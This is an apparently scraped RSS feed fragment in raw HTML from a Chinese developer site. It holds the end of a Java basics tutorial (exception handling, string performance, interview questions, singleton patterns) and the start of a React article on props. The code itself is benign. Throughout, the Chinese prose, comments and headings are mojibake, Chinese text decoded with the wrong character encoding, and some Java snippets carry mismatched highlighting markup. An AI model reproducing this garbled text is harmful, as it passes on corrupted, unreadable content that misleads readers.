} <span class="hljs-keyword">catch</span> (FileNotFoundException e) {
    log.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">"æ–‡ä»¶æœªæ‰¾åˆ°"</span>, e);
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BusinessException</span>(<span class="hljs-string">"æ–‡ä»¶å¤„ç†å¤±è´¥"</span>, e);
} <span class="hljs-keyword">finally</span> {
    <span class="hljs-title function_ invoke__">cleanup</span>();
}

<span class="hljs-comment">// ä¸å¥½çš„å®è·µ</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// æ•è·æ‰€æœ‰å¼‚å¸¸</span>
} <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) {
    <span class="hljs-comment">// ç©ºçš„catchå—</span>
}
</code></pre>
<h4 data-id="heading-39">10.3.5 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<ol>
<li><strong>å­—ç¬¦ä¸²æ“ä½œ</strong>ï¼šä½¿ç”¨StringBuilderæ‹¼æ¥</li>
<li><strong>é›†åˆåˆå§‹åŒ–</strong>ï¼šæŒ‡å®šåˆå§‹å®¹é‡</li>
<li><strong>é¿å…é‡å¤è®¡ç®—</strong>ï¼šç¼“å­˜ç»“æœ</li>
<li><strong>ä½¿ç”¨åŸºæœ¬ç±»å‹</strong>ï¼šä»£æ›¿åŒ…è£…ç±»</li>
</ol>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// ä¼˜åŒ–å‰
String <span class="hljs-attr">result</span> = <span class="hljs-string">""</span><span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 100; i++) {</span>
    result += i<span class="hljs-comment">;  // æ¯æ¬¡å¾ªç¯åˆ›å»ºæ–°å¯¹è±¡</span>
}

// ä¼˜åŒ–å
StringBuilder <span class="hljs-attr">sb</span> = new StringBuilder(<span class="hljs-number">100</span>)<span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 100; i++) {</span>
    sb.append(i)<span class="hljs-comment">;</span>
}
String <span class="hljs-attr">result</span> = sb.toString()<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-40">10.4 å¸¸è§é¢è¯•é¢˜è§£æ</h3>
<h4 data-id="heading-41">10.4.1 ç»å…¸é¢è¯•é¢˜æ±‡æ€»</h4>
<ol>
<li>Javaæ˜¯å€¼ä¼ é€’è¿˜æ˜¯å¼•ç”¨ä¼ é€’ï¼Ÿ</li>
<li>Stringä¸ºä»€ä¹ˆæ˜¯ä¸å¯å˜çš„ï¼Ÿ</li>
<li>equalså’Œ==çš„åŒºåˆ«ï¼Ÿ</li>
<li>finalã€finallyã€finalizeçš„åŒºåˆ«ï¼Ÿ</li>
</ol>
<h4 data-id="heading-42">10.4.2 é¢è¯•é¢˜è§£ç­”æ€è·¯</h4>
<p><strong>STARåŸåˆ™</strong>ï¼š</p>
<ul>
<li>Situationï¼šé—®é¢˜èƒŒæ™¯</li>
<li>Taskï¼šéœ€è¦è§£å†³çš„ä»»åŠ¡</li>
<li>Actionï¼šé‡‡å–çš„è¡ŒåŠ¨</li>
<li>Resultï¼šå–å¾—çš„ç»“æœ</li>
</ul>
<h4 data-id="heading-43">10.4.3 ä»£ç åˆ†æé¢˜ç¤ºä¾‹</h4>
<p>java</p>
<pre><code class="hljs language-ini" lang="ini">// é—®é¢˜ï¼šè¾“å‡ºç»“æœæ˜¯ä»€ä¹ˆï¼Ÿ
public class Test {
    public static void main(String<span class="hljs-section">[]</span> args) {
        String <span class="hljs-attr">s1</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">s2</span> = <span class="hljs-string">"hello"</span><span class="hljs-comment">;</span>
        String <span class="hljs-attr">s3</span> = new String(<span class="hljs-string">"hello"</span>)<span class="hljs-comment">;</span>
        
        System.out.println(<span class="hljs-attr">s1</span> == s2)<span class="hljs-comment">;  // true</span>
        System.out.println(<span class="hljs-attr">s1</span> == s3)<span class="hljs-comment">;  // false</span>
        System.out.println(s1.equals(s3))<span class="hljs-comment">;  // true</span>
    }
}
</code></pre>
<p><strong>è§£ç­”è¦ç‚¹</strong>ï¼š</p>
<ul>
<li>å­—ç¬¦ä¸²å¸¸é‡æ± </li>
<li>intern()æ–¹æ³•</li>
<li>å¯¹è±¡å¼•ç”¨æ¯”è¾ƒ vs å€¼æ¯”è¾ƒ</li>
</ul>
<h4 data-id="heading-44">10.4.4 è®¾è®¡æ€è·¯é¢˜</h4>
<p><strong>é¢˜ç›®</strong>ï¼šè®¾è®¡ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„å•ä¾‹æ¨¡å¼</p>
<p>java</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// åŒé‡æ£€æŸ¥é”å®š</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">static</span> Singleton instance;
    
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">getInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            synchronized (Singleton.<span class="hljs-keyword">class</span>) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> Singleton();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}

<span class="hljs-comment">// æšä¸¾å®ç°ï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-built_in">enum</span> SingletonEnum {
    INSTANCE;
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doSomething</span>()</span> {}
}
</code></pre>
<p><strong>è®¾è®¡è¦ç‚¹</strong>ï¼š</p>
<ol>
<li>å»¶è¿Ÿåˆå§‹åŒ–</li>
<li>çº¿ç¨‹å®‰å…¨</li>
<li>é˜²æ­¢åå°„æ”»å‡»</li>
<li>åºåˆ—åŒ–å®‰å…¨</li>
</ol>
<hr/>
<h3 data-id="heading-45">æ€»ç»“å¯¹æ¯”è¡¨</h3>








































<table><thead><tr><th>æ¦‚å¿µ</th><th>å…³é”®ç‚¹</th><th>æœ€ä½³å®è·µ</th></tr></thead><tbody><tr><td>å†…éƒ¨ç±»</td><td>è®¿é—®æƒé™ã€å†…å­˜æ³„æ¼</td><td>ä¼˜å…ˆä½¿ç”¨é™æ€å†…éƒ¨ç±»</td></tr><tr><td>æšä¸¾</td><td>ç±»å‹å®‰å…¨ã€å•ä¾‹æ¨¡å¼</td><td>æ›¿ä»£å¸¸é‡ç±»ï¼Œå®ç°æ¥å£</td></tr><tr><td>åºåˆ—åŒ–</td><td>å®‰å…¨æ€§ã€æ€§èƒ½</td><td>ä½¿ç”¨JSON/Protobufæ›¿ä»£</td></tr><tr><td>å‚æ•°ä¼ é€’</td><td>åªæœ‰å€¼ä¼ é€’</td><td>ç†è§£å¼•ç”¨å‰¯æœ¬æœºåˆ¶</td></tr><tr><td>åˆå§‹åŒ–</td><td>é™æ€â†’å®ä¾‹â†’æ„é€ </td><td>æ³¨æ„çˆ¶å­ç±»é¡ºåº</td></tr><tr><td>ç¼–ç è§„èŒƒ</td><td>å‘½åã€å¼‚å¸¸å¤„ç†</td><td>éµå¾ªå›¢é˜Ÿè§„èŒƒ</td></tr></tbody></table></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ·±å…¥ç†è§£ React ä¸­çš„ Propsï¼šç»„ä»¶é€šä¿¡çš„æ¡¥æ¢]]></title>    <link>https://juejin.cn/post/7589099845186060324</link>    <guid>https://juejin.cn/post/7589099845186060324</guid>    <pubDate>2025-12-29T09:15:01.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589099845186060324" data-draft-id="7589159665855217683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ·±å…¥ç†è§£ React ä¸­çš„ Propsï¼šç»„ä»¶é€šä¿¡çš„æ¡¥æ¢"/> <meta itemprop="keywords" content="å‰ç«¯,React.js,JavaScript"/> <meta itemprop="datePublished" content="2025-12-29T09:15:01.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¤¾æçš„ä¸‹æ°´é“èŸ‘è‚"/> <meta itemprop="url" content="https://juejin.cn/user/423789937565536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ·±å…¥ç†è§£ React ä¸­çš„ Propsï¼šç»„ä»¶é€šä¿¡çš„æ¡¥æ¢
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/423789937565536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¤¾æçš„ä¸‹æ°´é“èŸ‘è‚
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:15:01.000Z" title="Mon Dec 29 2025 09:15:01 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨ React å¼€å‘ä¸­ï¼Œ<code>state</code>Â å’ŒÂ <code>props</code>Â æ˜¯ä¸¤ä¸ªè‡³å…³é‡è¦çš„æ¦‚å¿µï¼Œå®ƒä»¬åˆ†åˆ«åœ¨ç®¡ç†ç»„ä»¶è‡ªèº«çŠ¶æ€å’Œå®ç°ç»„ä»¶é—´é€šä¿¡æ–¹é¢å‘æŒ¥ç€å…³é”®ä½œç”¨ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨Â <code>props</code>Â çš„ç‰¹æ€§ã€åœ¨ç»„ä»¶å¼€å‘ä¸­çš„åº”ç”¨ä»¥åŠå¦‚ä½•é€šè¿‡Â <code>props</code>Â å®ç°ç»„ä»¶é€šä¿¡ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€<code>state</code>Â ä¸Â <code>props</code>Â çš„åŒºåˆ«</h2>
<h3 data-id="heading-1"><code>state</code>ï¼šç»„ä»¶è‡ªèº«çŠ¶æ€çš„ç®¡ç†è€…</h3>
<p><code>state</code>Â ç”¨äºè¡¨ç¤ºç»„ä»¶è‡ªå·±æ‹¥æœ‰çš„æ•°æ®çŠ¶æ€ï¼Œå¹¶ä¸”å¯ä»¥æ ¹æ®ç»„ä»¶å†…éƒ¨çš„é€»è¾‘è¿›è¡Œæ”¹å˜ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæŒ‰é’®ç»„ä»¶å¯èƒ½æœ‰ä¸€ä¸ªÂ <code>state</code>Â æ¥è¡¨ç¤ºå®ƒæ˜¯å¦è¢«ç‚¹å‡»ï¼Œå½“ç”¨æˆ·ç‚¹å‡»æŒ‰é’®æ—¶ï¼Œç»„ä»¶å¯ä»¥é€šè¿‡æ›´æ–°Â <code>state</code>Â æ¥æ”¹å˜è‡ªèº«çš„æ˜¾ç¤ºçŠ¶æ€ï¼Œå¦‚ä» â€œæœªç‚¹å‡»â€ å˜ä¸º â€œå·²ç‚¹å‡»â€ã€‚è¿™ç§çŠ¶æ€çš„æ”¹å˜æ˜¯ç»„ä»¶å†…éƒ¨è‡ªä¸»è¿›è¡Œçš„ï¼Œåªä¸ç»„ä»¶è‡ªèº«çš„äº¤äº’å’Œé€»è¾‘ç›¸å…³ã€‚</p>
<h3 data-id="heading-2"><code>props</code>ï¼šçˆ¶ç»„ä»¶ä¼ é€’æ•°æ®çš„ä½¿è€…</h3>
<p><code>props</code>Â æ˜¯çˆ¶ç»„ä»¶ä¼ é€’ç»™å­ç»„ä»¶çš„æ•°æ®ï¼Œå­ç»„ä»¶ä¸èƒ½ç›´æ¥æ”¹å˜Â <code>props</code>Â çš„å€¼ã€‚è¿™å°±åƒæ˜¯ä¸Šçº§ç»™ä¸‹çº§å®‰æ’ä»»åŠ¡ï¼Œä¸‹çº§åªèƒ½æŒ‰ç…§ä¸Šçº§ç»™å®šçš„è¦æ±‚å»æ‰§è¡Œï¼Œè€Œä¸èƒ½æ“…è‡ªä¿®æ”¹ä»»åŠ¡å†…å®¹ã€‚<code>props</code>Â ä¸ºç»„ä»¶ä¹‹é—´çš„æ•°æ®ä¼ é€’æä¾›äº†ä¸€ç§å•å‘æµåŠ¨çš„æœºåˆ¶ï¼Œä¿è¯äº†æ•°æ®çš„å¯æ§æ€§å’Œå¯é¢„æµ‹æ€§ã€‚</p>
<h2 data-id="heading-3">äºŒã€ç»„ä»¶ï¼šæ„å»º React åº”ç”¨çš„åŸºçŸ³</h2>
<h3 data-id="heading-4">ç»„ä»¶å¦‚åŒä¹é«˜ç§¯æœ¨</h3>
<p>åœ¨ React å¼€å‘ä¸­ï¼Œç»„ä»¶å°±åƒä¹é«˜ç§¯æœ¨ä¸€æ ·ï¼Œé€šè¿‡å°†ä¸åŒåŠŸèƒ½çš„ç»„ä»¶ç»„åˆåœ¨ä¸€èµ·ï¼Œæˆ‘ä»¬å¯ä»¥æ„å»ºå‡ºå¤æ‚çš„é¡µé¢ã€‚æ¯ä¸ªç»„ä»¶éƒ½æ‰¿æ‹…ç€ç‰¹å®šçš„åŠŸèƒ½ï¼Œå®ƒä»¬ç›¸äº’åä½œï¼Œå…±åŒæ„æˆäº†å®Œæ•´çš„ç”¨æˆ·ç•Œé¢ã€‚è¿™ç§ç»„ä»¶åŒ–çš„å¼€å‘æ¨¡å¼ä½¿å¾—ä»£ç æ›´åŠ æ¨¡å—åŒ–ï¼Œæ˜“äºç†è§£ã€ç»´æŠ¤å’Œæ‰©å±•ã€‚</p>
<h3 data-id="heading-5">å¼€å‘ä»»åŠ¡çš„æœ€å°å•å…ƒ</h3>
<p>ç»„ä»¶æ˜¯ React å¼€å‘ä»»åŠ¡çš„æœ€å°å•å…ƒã€‚æ— è®ºæ˜¯ç®€å•çš„æŒ‰é’®ã€æ–‡æœ¬æ¡†ï¼Œè¿˜æ˜¯å¤æ‚çš„é¡µé¢å¸ƒå±€ï¼Œéƒ½å¯ä»¥å°è£…æˆä¸€ä¸ªç»„ä»¶ã€‚é€šè¿‡å°†é¡µé¢æ‹†åˆ†æˆå¤šä¸ªç»„ä»¶ï¼Œå¼€å‘è€…å¯ä»¥æ›´åŠ ä¸“æ³¨äºæ¯ä¸ªç»„ä»¶çš„åŠŸèƒ½å®ç°ï¼Œæé«˜å¼€å‘æ•ˆç‡ã€‚</p>
<h3 data-id="heading-6">ç»„ä»¶çš„å°è£…ä¸å­˜æ”¾</h3>
<p>é€šå¸¸ï¼Œæˆ‘ä»¬ä¼šå°†ç»„ä»¶å°è£…åœ¨Â <code>components</code>Â ç›®å½•ä¸‹ï¼Œä»¥ä¾¿äºç®¡ç†å’Œå¤ç”¨ã€‚è€ŒÂ <code>pages</code>Â ç›®å½•åˆ™ç”¨äºå­˜æ”¾é¡µé¢çº§åˆ«ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶é€šå¸¸ä¼šç»„åˆå¤šä¸ªå…¶ä»–ç»„ä»¶ï¼Œæ„æˆå®Œæ•´çš„é¡µé¢ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç”µå•†åº”ç”¨å¯èƒ½æœ‰Â <code>ProductList</code>Â ç»„ä»¶ç”¨äºå±•ç¤ºå•†å“åˆ—è¡¨ï¼Œ<code>Cart</code>Â ç»„ä»¶ç”¨äºç®¡ç†è´­ç‰©è½¦ï¼Œå®ƒä»¬éƒ½å¯ä»¥æ”¾åœ¨Â <code>components</code>Â ç›®å½•ä¸‹ã€‚è€ŒÂ <code>HomePage</code>ã€<code>ProductPage</code>Â ç­‰é¡µé¢çº§ç»„ä»¶åˆ™å­˜æ”¾åœ¨Â <code>pages</code>Â ç›®å½•ä¸­ã€‚</p>
<h3 data-id="heading-7">ç»„ä»¶çš„å¤ç”¨ä¸åä½œ</h3>
<p>ç»„ä»¶å…·æœ‰é«˜åº¦çš„å¤ç”¨æ€§ï¼Œä¸€ä¸ªç»„ä»¶å¯ä»¥åœ¨å¤šä¸ªä¸åŒçš„åœ°æ–¹è¢«ä½¿ç”¨ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªé€šç”¨çš„Â <code>Button</code>Â ç»„ä»¶å¯ä»¥åœ¨ä¸åŒçš„é¡µé¢å’ŒåŠŸèƒ½æ¨¡å—ä¸­å¤ç”¨ï¼Œé¿å…äº†é‡å¤å¼€å‘ã€‚åŒæ—¶ï¼Œç»„ä»¶ä¹‹é—´éœ€è¦ç›¸äº’åä½œï¼Œé€šè¿‡ä¼ é€’æ•°æ®å’Œè§¦å‘äº‹ä»¶æ¥å®ç°å¤æ‚çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªÂ <code>ProductList</code>Â ç»„ä»¶å¯èƒ½ä¼šå°†é€‰ä¸­çš„å•†å“ä¿¡æ¯ä¼ é€’ç»™Â <code>Cart</code>Â ç»„ä»¶ï¼Œå®ç°å•†å“æ·»åŠ åˆ°è´­ç‰©è½¦çš„åŠŸèƒ½ã€‚</p>
<h3 data-id="heading-8">ç»„ä»¶çš„åµŒå¥—ï¼šçˆ¶å­ç»„ä»¶å…³ç³»</h3>
<p>ç»„ä»¶ä¹‹é—´å¯ä»¥ç›¸äº’åµŒå¥—ï¼Œå½¢æˆçˆ¶å­ç»„ä»¶å…³ç³»ã€‚åœ¨è¿™ç§å…³ç³»ä¸­ï¼Œçˆ¶ç»„ä»¶å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªå­ç»„ä»¶ï¼Œå°±åƒÂ <code>App.jsx</code>Â å¯ä»¥ä½œä¸º â€œè€æ¿â€ï¼ŒåŒ…å«Â <code>Greeting.jsx</code>Â è¿™ä¸ª â€œå‘˜å·¥â€ ç»„ä»¶ã€‚çˆ¶ç»„ä»¶è´Ÿè´£ç®¡ç†å’Œåè°ƒå­ç»„ä»¶ï¼Œé€šè¿‡Â <code>props</code>Â å‘å­ç»„ä»¶ä¼ é€’æ•°æ®ï¼Œå­ç»„ä»¶åˆ™æ ¹æ®æ¥æ”¶åˆ°çš„Â <code>props</code>Â è¿›è¡Œç›¸åº”çš„å±•ç¤ºå’Œæ“ä½œã€‚</p>
<h2 data-id="heading-9">ä¸‰ã€ç»„ä»¶é€šä¿¡ï¼š<code>props</code>Â çš„é‡è¦ä½¿å‘½</h2>
<h3 data-id="heading-10">çˆ¶ç»„ä»¶ï¼šæ•°æ®çš„æŒæœ‰è€…</h3>
<p>åœ¨ React åº”ç”¨ä¸­ï¼Œçˆ¶ç»„ä»¶ä¸€èˆ¬ä¼šä½¿ç”¨Â <code>useState</code>Â ç­‰ Hook æ¥æŒæœ‰å¤æ‚çš„æ•°æ®ã€‚è¿™äº›æ•°æ®å¯èƒ½æ˜¯åº”ç”¨çš„å…¨å±€çŠ¶æ€ï¼Œæˆ–è€…æ˜¯ä¸å½“å‰çˆ¶ç»„ä»¶åŠå…¶å­ç»„ä»¶ç›¸å…³çš„æ•°æ®ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¾…åŠäº‹é¡¹åˆ—è¡¨åº”ç”¨çš„çˆ¶ç»„ä»¶å¯èƒ½æŒæœ‰æ‰€æœ‰å¾…åŠäº‹é¡¹çš„åˆ—è¡¨æ•°æ®ï¼Œé€šè¿‡Â <code>useState</code>Â æ¥ç®¡ç†è¿™äº›æ•°æ®çš„çŠ¶æ€ï¼Œå¦‚æ·»åŠ æ–°ä»»åŠ¡ã€åˆ é™¤å·²å®Œæˆä»»åŠ¡ç­‰ã€‚</p>
<h3 data-id="heading-11">å­ç»„ä»¶ï¼š<code>props</code>Â çš„æ¥æ”¶è€…</h3>
<p>å­ç»„ä»¶å¯ä»¥é€šè¿‡Â <code>props</code>Â æ‹¿åˆ°çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„æ•°æ®ã€‚åœ¨ React ä¸­ï¼Œå‡½æ•°å¼ç»„ä»¶é€šè¿‡å‚æ•°æ¥æ¥æ”¶Â <code>props</code>ï¼Œè¿™ä¸ªÂ <code>props</code>Â æ˜¯ä¸€ä¸ªåŒ…å«äº†çˆ¶ç»„ä»¶ä¼ é€’è¿‡æ¥çš„æ‰€æœ‰æ•°æ®çš„å¯¹è±¡ã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ªÂ <code>TodoItem</code>Â å­ç»„ä»¶ï¼Œçˆ¶ç»„ä»¶å¯èƒ½ä¼šä¼ é€’Â <code>text</code>ï¼ˆä»»åŠ¡æ–‡æœ¬ï¼‰ã€<code>completed</code>ï¼ˆä»»åŠ¡æ˜¯å¦å®Œæˆï¼‰ç­‰Â <code>props</code>Â ç»™å®ƒï¼Œ<code>TodoItem</code>Â ç»„ä»¶æ ¹æ®è¿™äº›Â <code>props</code>Â æ¥å†³å®šå¦‚ä½•å±•ç¤ºä»»åŠ¡ä¿¡æ¯ï¼Œå¦‚æ˜¯å¦æ˜¾ç¤ºåˆ é™¤çº¿æ¥è¡¨ç¤ºä»»åŠ¡å·²å®Œæˆã€‚</p>
<p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€å•çš„ä»£ç ç¤ºä¾‹ï¼Œå±•ç¤ºäº†çˆ¶ç»„ä»¶å¦‚ä½•é€šè¿‡Â <code>props</code>Â å‘å­ç»„ä»¶ä¼ é€’æ•°æ®ï¼š</p>
<p>jsx</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { useState } <span class="hljs-keyword">from</span><span class="hljs-string">'react'</span>;

<span class="hljs-comment">// å­ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Greeting</span> = (<span class="hljs-params">props</span>) =&gt; {
    <span class="hljs-keyword">return</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>ä½ å¥½, {props.name}!<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span></span>;
};

<span class="hljs-comment">// çˆ¶ç»„ä»¶</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">App</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">const</span> [userName, setUserName] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">'å¼ ä¸‰'</span>);

    <span class="hljs-keyword">return</span> (
        <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">Greeting</span> <span class="hljs-attr">name</span>=<span class="hljs-string">{userName}</span> /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setUserName('æå››')}&gt;æ›´æ”¹åå­—<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">App</span>;
</code></pre>
